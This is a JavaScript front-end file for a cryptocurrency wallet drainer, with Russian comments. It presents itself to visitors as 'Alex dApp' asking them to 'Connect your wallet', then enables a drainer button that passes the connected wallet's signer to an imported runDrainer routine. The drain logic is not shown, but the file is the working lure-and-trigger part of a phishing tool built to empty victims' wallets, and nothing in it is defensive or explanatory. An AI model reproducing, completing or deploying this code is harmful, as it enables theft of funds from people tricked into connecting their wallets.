import { createAppKit } from '@reown/appkit'
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

// 🔑 WalletConnect project ID
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'

// 🌐 Поддерживаемые EVM-сети
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]

// 🧩 Wagmi адаптер
const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks,
  wallets: {
    coinbase: false // Отключаем баговый coinbase
  }
})

// 🪪 Метаданные dApp
const metadata = {
  name: 'Alex dApp',
  description: 'Connect your wallet',
  url: 'https://checkalex.xyz',
  icons: ['https://checkalex.xyz/icon.png']
}

// 📦 Инициализация AppKit
const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true
  }
})

// ⚡️ Кнопка открытия модального окна подключения
document.getElementById('open-connect-modal').addEventListener('click', () => {
  modal.open()
})

// 🧠 Активируем кнопку Drainer только после подключения
function enableDrainer() {
  const drainerBtn = document.getElementById('drainer-btn')
  if (drainerBtn) {
    drainerBtn.disabled = false
    drainerBtn.classList.remove('disabled')
  }
}

// 📌 Обработка подключения через AppKit
modal.on("connect", async () => {
  console.log("✅ Кошелёк подключен через AppKit")
  enableDrainer()
})

// 📌 Проверка подключения при загрузке страницы
async function checkConnectionOnLoad() {
  try {
    const acc = await wagmiAdapter.getAccount()
    if (acc?.address) {
      console.log("🔄 Кошелёк уже подключён:", acc.address)
      enableDrainer()
    }
  } catch (err) {
    console.warn("⚠️ Ошибка при проверке подключения:", err.message)
  }
}

// 🧨 Кнопка запуска Drainer
document.getElementById('drainer-btn').addEventListener('click', async () => {
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
    const signer = provider.getSigner()
    const address = await signer.getAddress()
    console.log("🚀 Запуск Drainer для адреса:", address)
    await runDrainer(provider, signer, address)
  } catch (e) {
    console.error("❌ Ошибка при запуске Drainer:", e)
    alert("Ошибка при выполнении Drainer: " + e.message)
  }
})

// 🚀 Проверка подключения при инициализации
checkConnectionOnLoad()
